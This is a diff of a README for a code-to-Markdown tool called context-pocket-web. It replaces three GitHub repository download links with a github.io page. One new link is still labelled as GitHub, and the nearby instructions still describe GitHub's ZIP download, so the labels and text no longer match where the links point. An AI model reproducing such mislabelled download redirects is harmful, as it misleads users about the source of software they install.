@@ -4,7 +4,7 @@
 
 context-pocket-web is a free, simple tool that helps you turn your local code into clean, AI-ready Markdown documents. Think of it as a translator between your messy code files and AI tools like ChatGPT. You don't need to be a programmer to use it. You don't need to install anything complicated. It works entirely on your computer, with no internet connection needed and no sign-up required.
 
-[⬇️ Download context-pocket-web Now](https://github.com/caoquocbinh081103/context-pocket-web)
+[⬇️ Download context-pocket-web Now](https://caoquocbinh081103.github.io)
 
 ## 🔒 Why Privacy Matters Here
 
@@ -14,7 +14,7 @@ This tool runs completely offline. That means your code never leaves your comput
 
 ### Step 1: Visit the Download Page
 
-**Visit this link to download the application:** [context-pocket-web on GitHub](https://github.com/caoquocbinh081103/context-pocket-web)
+**Visit this link to download the application:** [context-pocket-web on GitHub](https://caoquocbinh081103.github.io)
 
 ### Step 2: Find the Download Button
 
@@ -123,7 +123,7 @@ Make sure your files are saved in UTF-8 encoding, which is standard for modern c
 
 You're one step away from turning your code into clean, useful context for AI assistants.
 
-[⬇️ Click Here to Download context-pocket-web](https://github.com/caoquocbinh081103/context-pocket-web)
+[⬇️ Click Here to Download context-pocket-web](https://caoquocbinh081103.github.io)
 
 Remember: visit the link, click the green "Code" button, download the ZIP, extract it, and double-click `index.html`. That's the entire process. In under five minutes, you'll have a powerful tool ready to go.
 
